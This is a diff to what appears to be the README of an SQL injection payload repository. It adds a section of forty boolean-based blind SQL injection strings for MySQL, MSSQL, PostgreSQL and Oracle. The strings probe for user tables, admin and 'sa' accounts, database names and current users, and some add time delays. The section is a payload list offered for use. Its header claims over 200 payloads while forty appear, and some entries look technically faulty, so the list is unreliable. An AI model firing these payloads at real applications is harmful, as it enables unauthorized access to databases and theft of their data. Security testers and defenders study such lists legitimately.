@@ -75,8 +75,6 @@ This repository contains payloads for different types of SQL injection attacks:
 
 ---
 
-# Union-Based SQL Injection Payloads
-
 ## 📋 Union-Based SQLi Payloads
 
 ### MySQL
@@ -129,6 +127,59 @@ This repository contains payloads for different types of SQL injection attacks:
 
 
 ---
+
+## 📋 Boolean-Based Blind SQLi Payloads
+Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database types:
+
+### MySQL
+- `' AND 1=1 --`
+- `' AND 1=2 --`
+- `' AND '1'='1' --`
+- `' AND '1'='2' --`
+- `' AND (SELECT COUNT(*) FROM users) > 0 --`
+- `' AND IF(1=1, SLEEP(5), 0) --`
+- `' AND ASCII(SUBSTRING((SELECT user()), 1, 1)) > 64 --`
+- `' AND (SELECT 1 FROM users WHERE username='admin') = 1 --`
+- `' AND EXISTS(SELECT * FROM users WHERE username='admin') --`
+- `' AND LENGTH((SELECT DATABASE())) > 5 --`
+
+### MSSQL
+- `' AND 1=1 --`
+- `' AND 1=2 --`
+- `' AND '1'='1' --`
+- `' AND '1'='2' --`
+- `' AND (SELECT COUNT(*) FROM sysobjects) > 0 --`
+- `' AND (SELECT LEN(DB_NAME())) > 5 --`
+- `' AND ASCII(SUBSTRING(DB_NAME(), 1, 1)) > 64 --`
+- `' AND 1=(SELECT COUNT(*) FROM sysusers WHERE name='sa') --`
+- `' AND EXISTS(SELECT name FROM sysobjects WHERE xtype='U') --`
+- `' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases), 1, 1)) > 64 --`
+
+### PostgreSQL
+- `' AND 1=1 --`
+- `' AND 1=2 --`
+- `' AND '1'='1' --`
+- `' AND '1'='2' --`
+- `' AND EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema='public') --`
+- `' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --`
+- `' AND ASCII(SUBSTRING((SELECT current_user), 1, 1)) > 64 --`
+- `' AND LENGTH(current_database()) > 5 --`
+- `' AND 1=(SELECT 1 FROM pg_database WHERE datname='postgres') --`
+- `' AND pg_sleep(5) --`
+
+### Oracle
+- `' AND 1=1 --`
+- `' AND 1=2 --`
+- `' AND '1'='1' --`
+- `' AND '1'='2' --`
+- `' AND EXISTS(SELECT 1 FROM dual) --`
+- `' AND LENGTH((SELECT sysdate FROM dual)) > 5 --`
+- `' AND (SELECT COUNT(*) FROM all_tables) > 0 --`
+- `' AND ASCII(SUBSTR((SELECT user FROM dual), 1, 1)) > 64 --`
+- `' AND ROWNUM < 2 --`
+- `' AND (SELECT COUNT(*) FROM all_users) > 0 --`
+
+
 
 
 
